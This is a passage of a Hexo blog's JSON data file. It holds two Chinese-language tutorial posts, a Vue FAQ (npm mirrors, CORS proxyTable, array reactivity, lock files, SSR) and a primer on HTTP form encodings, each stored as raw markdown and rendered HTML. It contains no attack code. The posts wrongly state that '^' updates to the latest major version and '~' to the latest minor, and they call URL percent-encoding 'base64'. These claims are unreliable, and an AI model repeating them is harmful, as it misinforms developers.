压缩，报错</li>\n</ul>\n<h2 id=\"keep-alive-缓存组件后很慢\"><a href=\"#keep-alive-缓存组件后很慢\" class=\"headerlink\" title=\"keep-alive 缓存组件后很慢\"></a>keep-alive 缓存组件后很慢</h2><ul>\n<li>因为都是保存在内存里面的，一旦大量组件缓存性能肯定不会好</li>\n</ul>\n"},{"title":"vue的一些问题集合（一）","date":"2018-04-02T03:25:32.000Z","_content":"\n> 在公司一直用 vue 开发，有时候被一些小伙伴经常问到的问题，这里收集一下勉强再挖个坑\n\n## npm install 安装超时\n\n* cnpm:npm i cnpm -g\n* yarn 和 npm 改成淘宝源\n\n```javascript\nnpm config : npm config set registry https://registry.npm.taobao.org\nyarn config : yarn config set registry https://registry.npm.taobao.org\n```\n\n## data functions should return an object\n\n这是因为你肯定在书写单组件，而单组件的 data 必须返回一个单例，可以参见[data 必须是函数](https://cn.vuejs.org/v2/guide/components.html#data-%E5%BF%85%E9%A1%BB%E6%98%AF%E5%87%BD%E6%95%B0)\n\n* 这里简单解释下，如果一个组件 data 引用的是一个同一个对象指针，那么当你在另外一个组件应用这个组件，v-for 他的时候，比如三个，那么你修改其中一个组件，另外两个这个组件的状态也会改变，但是我们的原则是组件间相互隔离，互不影响。\n\n## 在函数内写了 this.name（data 里存在 name），却报错 Cannot set property 'xxx' of undefined\n\n> 你期待 this 指向 vue 实例，实际上它指的是 window，this 和当前上下文有关\n\n* promise 的回调\n* setInterval\n\n比较好的解决方案就是使用箭头函数，绑定当前对象为 this 的上下文\n\n## Component template shold contain exactly one root element.If you are useing v-if on multiple elements\n\n* 单组件文件里必须要有个根元素，一个大 div\n\n## No 'Access-Control-Allow-Origin' header is present on the requested resource.\n\n> 跨域问题\n\n* CORS 前后端配置\n* nginx 反向代理，一般线上使用\n* 本地开发，脚手架 vue-cli 里有 proxyTable\n\n```javascript\n// target : 就是 api 的代理的实际路径\n// changeOrigin: 必须是变源\n// pathRewrite : 路径重定向\nproxyTable: {\n  \"/api\": {\n    target: \"http://yoki.com\",\n    changeOrigin: true,\n    // pathRewrite: {\n    //   \"^/api\": \"/\"\n    // }\n  }\n}\n```\n\n## 数组里的值手动更新了，为什么视图不更新\n\n> this.arr[0]=1,但是视图没更新\n\n* 这是因为 vue 重写了数组的原生方法，使用了数组方法 push，pop 等，会对其观察，并响应到视图。究其原因是 js 无法检测到到数组的变化\n* 可以使用 this.$set\n* 可以数组的方法更改\n\n## 为什么根目录下会有 lock 文件\n\n> 先简单介绍一下 A.B.C：A 是 major 版本表示和上个版本不兼容的大更改，B 是 minor 版本增加了新功能，可以向后兼容，C 是 patch 版本修复了 bug 向后兼容\n\n* npm 上包那么多，说不定什么时候就会更新，根据 package.json 里的^(会更新到 major 版本号最新的),~（会更新到 minor 版本最新的）\n* 有些包甚至不遵循发包规范\n* 所以我们需要统一版本号，这样不同的电脑在不同的时间就会下载到一样的包了\n\n## npm i -S 和-D 的区别\n\n* -S 会放到 dependencies 里面，存放到线上能访问到的代码，比如 vue，vue-router\n* -D 会放到 devDependcies：处于开发模式所依赖的模块，不产生额外代码到生产环境，比如 babel-core\n\n## 单页应用没办法做 seo 吗\n\n* spa 的页面由 javascript 根据 API 发回的数据在用户的浏览器里自动生成的，Baidu 不会看 Javascript，那么页面对于它来说就是一个空洞洞的 html 和很多 scirpt 元素\n* 解决方案：服务端渲染(SSR)可以,请求回来是一个处理好的 html，vue 的服务端渲染方案[nuxt](https://zh.nuxtjs.org/)\n\n## 为什么首屏加载这么慢\n\n> 打包文件文件很大\n\n* 减少 jq 这种库的引入，现在都是数据驱动\n* webpack 压缩 js，css\n* 路由懒加载，代码分割\n* 采用服务端渲染，可以避免浏览器去解析模板和指令\n","source":"_posts/study-vue1.md","raw":"---\ntitle: vue的一些问题集合（一）\ndate: 2018-04-02 11:25:32\ntags: Vue\n---\n\n> 在公司一直用 vue 开发，有时候被一些小伙伴经常问到的问题，这里收集一下勉强再挖个坑\n\n## npm install 安装超时\n\n* cnpm:npm i cnpm -g\n* yarn 和 npm 改成淘宝源\n\n```javascript\nnpm config : npm config set registry https://registry.npm.taobao.org\nyarn config : yarn config set registry https://registry.npm.taobao.org\n```\n\n## data functions should return an object\n\n这是因为你肯定在书写单组件，而单组件的 data 必须返回一个单例，可以参见[data 必须是函数](https://cn.vuejs.org/v2/guide/components.html#data-%E5%BF%85%E9%A1%BB%E6%98%AF%E5%87%BD%E6%95%B0)\n\n* 这里简单解释下，如果一个组件 data 引用的是一个同一个对象指针，那么当你在另外一个组件应用这个组件，v-for 他的时候，比如三个，那么你修改其中一个组件，另外两个这个组件的状态也会改变，但是我们的原则是组件间相互隔离，互不影响。\n\n## 在函数内写了 this.name（data 里存在 name），却报错 Cannot set property 'xxx' of undefined\n\n> 你期待 this 指向 vue 实例，实际上它指的是 window，this 和当前上下文有关\n\n* promise 的回调\n* setInterval\n\n比较好的解决方案就是使用箭头函数，绑定当前对象为 this 的上下文\n\n## Component template shold contain exactly one root element.If you are useing v-if on multiple elements\n\n* 单组件文件里必须要有个根元素，一个大 div\n\n## No 'Access-Control-Allow-Origin' header is present on the requested resource.\n\n> 跨域问题\n\n* CORS 前后端配置\n* nginx 反向代理，一般线上使用\n* 本地开发，脚手架 vue-cli 里有 proxyTable\n\n```javascript\n// target : 就是 api 的代理的实际路径\n// changeOrigin: 必须是变源\n// pathRewrite : 路径重定向\nproxyTable: {\n  \"/api\": {\n    target: \"http://yoki.com\",\n    changeOrigin: true,\n    // pathRewrite: {\n    //   \"^/api\": \"/\"\n    // }\n  }\n}\n```\n\n## 数组里的值手动更新了，为什么视图不更新\n\n> this.arr[0]=1,但是视图没更新\n\n* 这是因为 vue 重写了数组的原生方法，使用了数组方法 push，pop 等，会对其观察，并响应到视图。究其原因是 js 无法检测到到数组的变化\n* 可以使用 this.$set\n* 可以数组的方法更改\n\n## 为什么根目录下会有 lock 文件\n\n> 先简单介绍一下 A.B.C：A 是 major 版本表示和上个版本不兼容的大更改，B 是 minor 版本增加了新功能，可以向后兼容，C 是 patch 版本修复了 bug 向后兼容\n\n* npm 上包那么多，说不定什么时候就会更新，根据 package.json 里的^(会更新到 major 版本号最新的),~（会更新到 minor 版本最新的）\n* 有些包甚至不遵循发包规范\n* 所以我们需要统一版本号，这样不同的电脑在不同的时间就会下载到一样的包了\n\n## npm i -S 和-D 的区别\n\n* -S 会放到 dependencies 里面，存放到线上能访问到的代码，比如 vue，vue-router\n* -D 会放到 devDependcies：处于开发模式所依赖的模块，不产生额外代码到生产环境，比如 babel-core\n\n## 单页应用没办法做 seo 吗\n\n* spa 的页面由 javascript 根据 API 发回的数据在用户的浏览器里自动生成的，Baidu 不会看 Javascript，那么页面对于它来说就是一个空洞洞的 html 和很多 scirpt 元素\n* 解决方案：服务端渲染(SSR)可以,请求回来是一个处理好的 html，vue 的服务端渲染方案[nuxt](https://zh.nuxtjs.org/)\n\n## 为什么首屏加载这么慢\n\n> 打包文件文件很大\n\n* 减少 jq 这种库的引入，现在都是数据驱动\n* webpack 压缩 js，css\n* 路由懒加载，代码分割\n* 采用服务端渲染，可以避免浏览器去解析模板和指令\n","slug":"study-vue1","published":1,"updated":"2018-04-17T06:20:24.416Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034se004g0iofhiut53m5","content":"<blockquote>\n<p>在公司一直用 vue 开发，有时候被一些小伙伴经常问到的问题，这里收集一下勉强再挖个坑</p>\n</blockquote>\n<h2 id=\"npm-install-安装超时\"><a href=\"#npm-install-安装超时\" class=\"headerlink\" title=\"npm install 安装超时\"></a>npm install 安装超时</h2><ul>\n<li>cnpm:npm i cnpm -g</li>\n<li>yarn 和 npm 改成淘宝源</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config : npm config set registry https:<span class=\"comment\">//registry.npm.taobao.org</span></span><br><span class=\"line\">yarn config : yarn config set registry https:<span class=\"comment\">//registry.npm.taobao.org</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"data-functions-should-return-an-object\"><a href=\"#data-functions-should-return-an-object\" class=\"headerlink\" title=\"data functions should return an object\"></a>data functions should return an object</h2><p>这是因为你肯定在书写单组件，而单组件的 data 必须返回一个单例，可以参见<a href=\"https://cn.vuejs.org/v2/guide/components.html#data-%E5%BF%85%E9%A1%BB%E6%98%AF%E5%87%BD%E6%95%B0\" target=\"_blank\" rel=\"noopener\">data 必须是函数</a></p>\n<ul>\n<li>这里简单解释下，如果一个组件 data 引用的是一个同一个对象指针，那么当你在另外一个组件应用这个组件，v-for 他的时候，比如三个，那么你修改其中一个组件，另外两个这个组件的状态也会改变，但是我们的原则是组件间相互隔离，互不影响。</li>\n</ul>\n<h2 id=\"在函数内写了-this-name（data-里存在-name），却报错-Cannot-set-property-‘xxx’-of-undefined\"><a href=\"#在函数内写了-this-name（data-里存在-name），却报错-Cannot-set-property-‘xxx’-of-undefined\" class=\"headerlink\" title=\"在函数内写了 this.name（data 里存在 name），却报错 Cannot set property ‘xxx’ of undefined\"></a>在函数内写了 this.name（data 里存在 name），却报错 Cannot set property ‘xxx’ of undefined</h2><blockquote>\n<p>你期待 this 指向 vue 实例，实际上它指的是 window，this 和当前上下文有关</p>\n</blockquote>\n<ul>\n<li>promise 的回调</li>\n<li>setInterval</li>\n</ul>\n<p>比较好的解决方案就是使用箭头函数，绑定当前对象为 this 的上下文</p>\n<h2 id=\"Component-template-shold-contain-exactly-one-root-element-If-you-are-useing-v-if-on-multiple-elements\"><a href=\"#Component-template-shold-contain-exactly-one-root-element-If-you-are-useing-v-if-on-multiple-elements\" class=\"headerlink\" title=\"Component template shold contain exactly one root element.If you are useing v-if on multiple elements\"></a>Component template shold contain exactly one root element.If you are useing v-if on multiple elements</h2><ul>\n<li>单组件文件里必须要有个根元素，一个大 div</li>\n</ul>\n<h2 id=\"No-‘Access-Control-Allow-Origin’-header-is-present-on-the-requested-resource\"><a href=\"#No-‘Access-Control-Allow-Origin’-header-is-present-on-the-requested-resource\" class=\"headerlink\" title=\"No ‘Access-Control-Allow-Origin’ header is present on the requested resource.\"></a>No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</h2><blockquote>\n<p>跨域问题</p>\n</blockquote>\n<ul>\n<li>CORS 前后端配置</li>\n<li>nginx 反向代理，一般线上使用</li>\n<li>本地开发，脚手架 vue-cli 里有 proxyTable</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// target : 就是 api 的代理的实际路径</span></span><br><span class=\"line\"><span class=\"comment\">// changeOrigin: 必须是变源</span></span><br><span class=\"line\"><span class=\"comment\">// pathRewrite : 路径重定向</span></span><br><span class=\"line\">proxyTable: &#123;</span><br><span class=\"line\">  <span class=\"string\">\"/api\"</span>: &#123;</span><br><span class=\"line\">    target: <span class=\"string\">\"http://yoki.com\"</span>,</span><br><span class=\"line\">    changeOrigin: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// pathRewrite: &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   \"^/api\": \"/\"</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"数组里的值手动更新了，为什么视图不更新\"><a href=\"#数组里的值手动更新了，为什么视图不更新\" class=\"headerlink\" title=\"数组里的值手动更新了，为什么视图不更新\"></a>数组里的值手动更新了，为什么视图不更新</h2><blockquote>\n<p>this.arr[0]=1,但是视图没更新</p>\n</blockquote>\n<ul>\n<li>这是因为 vue 重写了数组的原生方法，使用了数组方法 push，pop 等，会对其观察，并响应到视图。究其原因是 js 无法检测到到数组的变化</li>\n<li>可以使用 this.$set</li>\n<li>可以数组的方法更改</li>\n</ul>\n<h2 id=\"为什么根目录下会有-lock-文件\"><a href=\"#为什么根目录下会有-lock-文件\" class=\"headerlink\" title=\"为什么根目录下会有 lock 文件\"></a>为什么根目录下会有 lock 文件</h2><blockquote>\n<p>先简单介绍一下 A.B.C：A 是 major 版本表示和上个版本不兼容的大更改，B 是 minor 版本增加了新功能，可以向后兼容，C 是 patch 版本修复了 bug 向后兼容</p>\n</blockquote>\n<ul>\n<li>npm 上包那么多，说不定什么时候就会更新，根据 package.json 里的^(会更新到 major 版本号最新的),~（会更新到 minor 版本最新的）</li>\n<li>有些包甚至不遵循发包规范</li>\n<li>所以我们需要统一版本号，这样不同的电脑在不同的时间就会下载到一样的包了</li>\n</ul>\n<h2 id=\"npm-i-S-和-D-的区别\"><a href=\"#npm-i-S-和-D-的区别\" class=\"headerlink\" title=\"npm i -S 和-D 的区别\"></a>npm i -S 和-D 的区别</h2><ul>\n<li>-S 会放到 dependencies 里面，存放到线上能访问到的代码，比如 vue，vue-router</li>\n<li>-D 会放到 devDependcies：处于开发模式所依赖的模块，不产生额外代码到生产环境，比如 babel-core</li>\n</ul>\n<h2 id=\"单页应用没办法做-seo-吗\"><a href=\"#单页应用没办法做-seo-吗\" class=\"headerlink\" title=\"单页应用没办法做 seo 吗\"></a>单页应用没办法做 seo 吗</h2><ul>\n<li>spa 的页面由 javascript 根据 API 发回的数据在用户的浏览器里自动生成的，Baidu 不会看 Javascript，那么页面对于它来说就是一个空洞洞的 html 和很多 scirpt 元素</li>\n<li>解决方案：服务端渲染(SSR)可以,请求回来是一个处理好的 html，vue 的服务端渲染方案<a href=\"https://zh.nuxtjs.org/\" target=\"_blank\" rel=\"noopener\">nuxt</a></li>\n</ul>\n<h2 id=\"为什么首屏加载这么慢\"><a href=\"#为什么首屏加载这么慢\" class=\"headerlink\" title=\"为什么首屏加载这么慢\"></a>为什么首屏加载这么慢</h2><blockquote>\n<p>打包文件文件很大</p>\n</blockquote>\n<ul>\n<li>减少 jq 这种库的引入，现在都是数据驱动</li>\n<li>webpack 压缩 js，css</li>\n<li>路由懒加载，代码分割</li>\n<li>采用服务端渲染，可以避免浏览器去解析模板和指令</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>在公司一直用 vue 开发，有时候被一些小伙伴经常问到的问题，这里收集一下勉强再挖个坑</p>\n</blockquote>\n<h2 id=\"npm-install-安装超时\"><a href=\"#npm-install-安装超时\" class=\"headerlink\" title=\"npm install 安装超时\"></a>npm install 安装超时</h2><ul>\n<li>cnpm:npm i cnpm -g</li>\n<li>yarn 和 npm 改成淘宝源</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config : npm config set registry https:<span class=\"comment\">//registry.npm.taobao.org</span></span><br><span class=\"line\">yarn config : yarn config set registry https:<span class=\"comment\">//registry.npm.taobao.org</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"data-functions-should-return-an-object\"><a href=\"#data-functions-should-return-an-object\" class=\"headerlink\" title=\"data functions should return an object\"></a>data functions should return an object</h2><p>这是因为你肯定在书写单组件，而单组件的 data 必须返回一个单例，可以参见<a href=\"https://cn.vuejs.org/v2/guide/components.html#data-%E5%BF%85%E9%A1%BB%E6%98%AF%E5%87%BD%E6%95%B0\" target=\"_blank\" rel=\"noopener\">data 必须是函数</a></p>\n<ul>\n<li>这里简单解释下，如果一个组件 data 引用的是一个同一个对象指针，那么当你在另外一个组件应用这个组件，v-for 他的时候，比如三个，那么你修改其中一个组件，另外两个这个组件的状态也会改变，但是我们的原则是组件间相互隔离，互不影响。</li>\n</ul>\n<h2 id=\"在函数内写了-this-name（data-里存在-name），却报错-Cannot-set-property-‘xxx’-of-undefined\"><a href=\"#在函数内写了-this-name（data-里存在-name），却报错-Cannot-set-property-‘xxx’-of-undefined\" class=\"headerlink\" title=\"在函数内写了 this.name（data 里存在 name），却报错 Cannot set property ‘xxx’ of undefined\"></a>在函数内写了 this.name（data 里存在 name），却报错 Cannot set property ‘xxx’ of undefined</h2><blockquote>\n<p>你期待 this 指向 vue 实例，实际上它指的是 window，this 和当前上下文有关</p>\n</blockquote>\n<ul>\n<li>promise 的回调</li>\n<li>setInterval</li>\n</ul>\n<p>比较好的解决方案就是使用箭头函数，绑定当前对象为 this 的上下文</p>\n<h2 id=\"Component-template-shold-contain-exactly-one-root-element-If-you-are-useing-v-if-on-multiple-elements\"><a href=\"#Component-template-shold-contain-exactly-one-root-element-If-you-are-useing-v-if-on-multiple-elements\" class=\"headerlink\" title=\"Component template shold contain exactly one root element.If you are useing v-if on multiple elements\"></a>Component template shold contain exactly one root element.If you are useing v-if on multiple elements</h2><ul>\n<li>单组件文件里必须要有个根元素，一个大 div</li>\n</ul>\n<h2 id=\"No-‘Access-Control-Allow-Origin’-header-is-present-on-the-requested-resource\"><a href=\"#No-‘Access-Control-Allow-Origin’-header-is-present-on-the-requested-resource\" class=\"headerlink\" title=\"No ‘Access-Control-Allow-Origin’ header is present on the requested resource.\"></a>No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</h2><blockquote>\n<p>跨域问题</p>\n</blockquote>\n<ul>\n<li>CORS 前后端配置</li>\n<li>nginx 反向代理，一般线上使用</li>\n<li>本地开发，脚手架 vue-cli 里有 proxyTable</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// target : 就是 api 的代理的实际路径</span></span><br><span class=\"line\"><span class=\"comment\">// changeOrigin: 必须是变源</span></span><br><span class=\"line\"><span class=\"comment\">// pathRewrite : 路径重定向</span></span><br><span class=\"line\">proxyTable: &#123;</span><br><span class=\"line\">  <span class=\"string\">\"/api\"</span>: &#123;</span><br><span class=\"line\">    target: <span class=\"string\">\"http://yoki.com\"</span>,</span><br><span class=\"line\">    changeOrigin: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// pathRewrite: &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   \"^/api\": \"/\"</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"数组里的值手动更新了，为什么视图不更新\"><a href=\"#数组里的值手动更新了，为什么视图不更新\" class=\"headerlink\" title=\"数组里的值手动更新了，为什么视图不更新\"></a>数组里的值手动更新了，为什么视图不更新</h2><blockquote>\n<p>this.arr[0]=1,但是视图没更新</p>\n</blockquote>\n<ul>\n<li>这是因为 vue 重写了数组的原生方法，使用了数组方法 push，pop 等，会对其观察，并响应到视图。究其原因是 js 无法检测到到数组的变化</li>\n<li>可以使用 this.$set</li>\n<li>可以数组的方法更改</li>\n</ul>\n<h2 id=\"为什么根目录下会有-lock-文件\"><a href=\"#为什么根目录下会有-lock-文件\" class=\"headerlink\" title=\"为什么根目录下会有 lock 文件\"></a>为什么根目录下会有 lock 文件</h2><blockquote>\n<p>先简单介绍一下 A.B.C：A 是 major 版本表示和上个版本不兼容的大更改，B 是 minor 版本增加了新功能，可以向后兼容，C 是 patch 版本修复了 bug 向后兼容</p>\n</blockquote>\n<ul>\n<li>npm 上包那么多，说不定什么时候就会更新，根据 package.json 里的^(会更新到 major 版本号最新的),~（会更新到 minor 版本最新的）</li>\n<li>有些包甚至不遵循发包规范</li>\n<li>所以我们需要统一版本号，这样不同的电脑在不同的时间就会下载到一样的包了</li>\n</ul>\n<h2 id=\"npm-i-S-和-D-的区别\"><a href=\"#npm-i-S-和-D-的区别\" class=\"headerlink\" title=\"npm i -S 和-D 的区别\"></a>npm i -S 和-D 的区别</h2><ul>\n<li>-S 会放到 dependencies 里面，存放到线上能访问到的代码，比如 vue，vue-router</li>\n<li>-D 会放到 devDependcies：处于开发模式所依赖的模块，不产生额外代码到生产环境，比如 babel-core</li>\n</ul>\n<h2 id=\"单页应用没办法做-seo-吗\"><a href=\"#单页应用没办法做-seo-吗\" class=\"headerlink\" title=\"单页应用没办法做 seo 吗\"></a>单页应用没办法做 seo 吗</h2><ul>\n<li>spa 的页面由 javascript 根据 API 发回的数据在用户的浏览器里自动生成的，Baidu 不会看 Javascript，那么页面对于它来说就是一个空洞洞的 html 和很多 scirpt 元素</li>\n<li>解决方案：服务端渲染(SSR)可以,请求回来是一个处理好的 html，vue 的服务端渲染方案<a href=\"https://zh.nuxtjs.org/\" target=\"_blank\" rel=\"noopener\">nuxt</a></li>\n</ul>\n<h2 id=\"为什么首屏加载这么慢\"><a href=\"#为什么首屏加载这么慢\" class=\"headerlink\" title=\"为什么首屏加载这么慢\"></a>为什么首屏加载这么慢</h2><blockquote>\n<p>打包文件文件很大</p>\n</blockquote>\n<ul>\n<li>减少 jq 这种库的引入，现在都是数据驱动</li>\n<li>webpack 压缩 js，css</li>\n<li>路由懒加载，代码分割</li>\n<li>采用服务端渲染，可以避免浏览器去解析模板和指令</li>\n</ul>\n"},{"title":"Http表单的常见编码","date":"2018-05-11T15:14:51.000Z","_content":"\n## 什么是 http 表单\n\n> web 最常见的就是 post 和 get 方法。其中 get 一般将参数编码在 url 中来传递数据，post 或者 put 必须要将数据放在 http 请求实体中，这样的数据就是 http 表单\n\n* 表单数据的编码方式是 http 头部设置 Content-Type\n* Content-Type 可以是任意 MIME 类型\n* 下面五种最为常见\n  * URLencoded：application/x-www-form-urlencoded\n  * mutipart:mutipart/form-data\n  * json:application/json\n  * xml:text/xml\n  * 纯文本：text/plain\n* html 的 form 表单支持 urlencoded，mutipart 和 plain text 的编码，通过 enctype 属性来设定。\n* ajax 默认是 json 格式的编码\n\n### URLencoded\n\n> form 表单的 enctype 默认就是 urlencoded\n\n```javascript\n<form  method='post' enctype='application/x-www-form-urlencoded'>\n  <input type=\"text\" name='title'>\n  <input type=\"text\" name='subtitle'>\n  <input type=\"submit\">\n</form>\n//http请求头\nContent-Type: application/x-www-form-urlencoded\n//请求体\ntitle=test&subtitle=%E4%B8%AD%E5%9B%BD=>base64编码（url通用的编码，可以在chrome控制台用decodeURI解码）\n```\n\n### JSON\n\n```javascript\n$.post('/xxx', {\n    title: 'test',\n    content: [1,2,3]\n});\nContent-Type: application/json;charset=utf-8\n//请求实体\n{\"title\":\"test\",\"content\":[1,2,3]}\n```\n\n### XML\n\n```javascript\nContent-Type: text/xml\n//请求实体\n<!--?xml version=\"1.0\"?-->\n<methodcall>\n    <methodname>examples.getStateName</methodname>\n    <params>\n        <param>\n            <value><i4>41</i4></value>\n    </params>\n</methodcall>\n```\n","source":"_posts/study-web-form.md","raw":"---\ntitle: Http表单的常见编码\ndate: 2018-05-11 23:14:51\ntags: Http\n---\n\n## 什么是 http 表单\n\n> web 最常见的就是 post 和 get 方法。其中 get 一般将参数编码在 url 中来传递数据，post 或者 put 必须要将数据放在 http 请求实体中，这样的数据就是 http 表单\n\n* 表单数据的编码方式是 http 头部设置 Content-Type\n* Content-Type 可以是任意 MIME 类型\n* 下面五种最为常见\n  * URLencoded：application/x-www-form-urlencoded\n  * mutipart:mutipart/form-data\n  * json:application/json\n  * xml:text/xml\n  * 纯文本：text/plain\n* html 的 form 表单支持 urlencoded，mutipart 和 plain text 的编码，通过 enctype 属性来设定。\n* ajax 默认是 json 格式的编码\n\n### URLencoded\n\n> form 表单的 enctype 默认就是 urlencoded\n\n```javascript\n<form  method='post' enctype='application/x-www-form-urlencoded'>\n  <input type=\"text\" name='title'>\n  <input type=\"text\" name='subtitle'>\n  <input type=\"submit\">\n</form>\n//http请求头\nContent-Type: application/x-www-form-urlencoded\n//请求体\ntitle=test&subtitle=%E4%B8%AD%E5%9B%BD=>base64编码（url通用的编码，可以在chrome控制台用decodeURI解码）\n```\n\n### JSON\n\n```javascript\n$.post('/xxx', {\n    title: 'test',\n    content: [1,2,3]\n});\nContent-Type: application/json;charset=utf-8\n//请求实体\n{\"title\":\"test\",\"content\":[1,2,3]}\n```\n\n### XML\n\n```javascript\nContent-Type: text/xml\n//请求实体\n<!--?xml version=\"1.0\"?-->\n<methodcall>\n    <methodname>examples.getStateName</methodname>\n    <params>\n        <param>\n            <value><i4>41</i4></value>\n    </params>\n</methodcall>\n```\n","slug":"study-web-form","published":1,"updated":"2018-05-12T13:44:11.982Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034si004h0iofupo94b6c","content":"<h2 id=\"什么是-http-表单\"><a href=\"#什么是-http-表单\" class=\"headerlink\" title=\"什么是 http 表单\"></a>什么是 http 表单</h2><blockquote>\n<p>web 最常见的就是 post 和 get 方法。其中 get 一般将参数编码在 url 中来传递数据，post 或者 put 必须要将数据放在 http 请求实体中，这样的数据就是 http 表单</p>\n</blockquote>\n<ul>\n<li>表单数据的编码方式是 http 头部设置 Content-Type</li>\n<li>Content-Type 可以是任意 MIME 类型</li>\n<li>下面五种最为常见<ul>\n<li>URLencoded：application/x-www-form-urlencoded</li>\n<li>mutipart:mutipart/form-data</li>\n<li>json:application/json</li>\n<li>xml:text/xml</li>\n<li>纯文本：text/plain</li>\n</ul>\n</li>\n<li>html 的 form 表单支持 urlencoded，mutipart 和 plain text 的编码，通过 enctype 属性来设定。</li>\n<li>ajax 默认是 json 格式的编码</li>\n</ul>\n<h3 id=\"URLencoded\"><a href=\"#URLencoded\" class=\"headerlink\" title=\"URLencoded\"></a>URLencoded</h3><blockquote>\n<p>form 表单的 enctype 默认就是 urlencoded</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form  method=<span class=\"string\">'post'</span> enctype=<span class=\"string\">'application/x-www-form-urlencoded'</span>&gt;</span><br><span class=\"line\">  &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">'title'</span>&gt;</span><br><span class=\"line\">  &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">'subtitle'</span>&gt;</span><br><span class=\"line\">  &lt;input type=<span class=\"string\">\"submit\"</span>&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/form&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/http请求头</span></span><br><span class=\"line\"><span class=\"regexp\">Content-Type: application/</span>x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"comment\">//请求体</span></span><br><span class=\"line\">title=test&amp;subtitle=%E4%B8%AD%E5%<span class=\"number\">9</span>B%<span class=\"function\"><span class=\"params\">BD</span>=&gt;</span>base64编码（url通用的编码，可以在chrome控制台用<span class=\"built_in\">decodeURI</span>解码）</span><br></pre></td></tr></table></figure>\n<h3 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.post(<span class=\"string\">'/xxx'</span>, &#123;</span><br><span class=\"line\">    title: <span class=\"string\">'test'</span>,</span><br><span class=\"line\">    content: [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">Content-Type: application/json;charset=utf<span class=\"number\">-8</span></span><br><span class=\"line\"><span class=\"comment\">//请求实体</span></span><br><span class=\"line\">&#123;<span class=\"string\">\"title\"</span>:<span class=\"string\">\"test\"</span>,<span class=\"string\">\"content\"</span>:[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"XML\"><a href=\"#XML\" class=\"headerlink\" title=\"XML\"></a>XML</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: text/xml</span><br><span class=\"line\"><span class=\"comment\">//请求实体</span></span><br><span class=\"line\">&lt;!--?xml version=<span class=\"string\">\"1.0\"</span>?--&gt;</span><br><span class=\"line\">&lt;methodcall&gt;</span><br><span class=\"line\">    &lt;methodname&gt;examples.getStateName&lt;<span class=\"regexp\">/methodname&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;params&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;param&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            